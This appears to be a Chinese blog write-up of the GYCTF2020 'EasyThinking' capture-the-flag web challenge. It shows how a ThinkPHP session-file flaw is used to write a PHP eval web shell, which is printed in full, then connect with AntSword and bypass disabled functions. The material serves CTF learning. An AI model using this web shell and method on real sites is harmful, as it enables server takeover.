---
title: '[GYCTF2020]EasyThinking1简单解析'
abbrlink: d0e6a187
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# [GYCTF2020]EasyThinking1简单解析

## 题目：

御剑扫描到www.zip，打开

![image-20260514214733647](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514214733711.png)

得知是thinkphp框架，网上自行搜索这个版本的漏洞

https://www.cnblogs.com/Litsasuk/articles/18399299

https://xz.aliyun.com/news/8139

---

## 思路：

1.登陆时session注入，写入文件名长32位的php文件

![image-20260514220342509](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514220342602.png)

2.搜索时注入一句话木马，并抓包修改cookie

```
<?php eval($_POST[1]); ?>
```

你的历史记录内容会被写入文件，文件名就是uid，我们只要保证这次记录也写入我们一开始准备好的文件里面就行：即 修改文件名（修改uid）

![image-20260514220328712](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514220328780.png)

3.打开文件，蚁剑连接，利用插件绕过禁用函数

文件位置：

```
/runtime/session/sess_1234567123456712345671234568.php
```

![image-20260514220526667](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514220526777.png)

蚁剑利用插件

![image-20260514220602826](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514220602939.png)

---

## 源代码简单探索：

解题思路：用户在搜索时和在登陆时都是用的同一个sessionuid，我们可以联想到需要利用这个uid创造文件，写入文件，然后打开文件

以下是经过www.zip下载到的部分源码：

1.session获得的UID被存进data的uid里面

![image-20260514214059824](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514214059935.png)

4.在登陆时用户和uid联系在一起，需要session有uid传入

![image-20260514214132263](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514214132397.png)

3.在搜索时仍然需要session中的uid，

能发现存在搜索记录，也就是一开始我们搜索后看到的

![image-20260514214242081](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514214242194.png)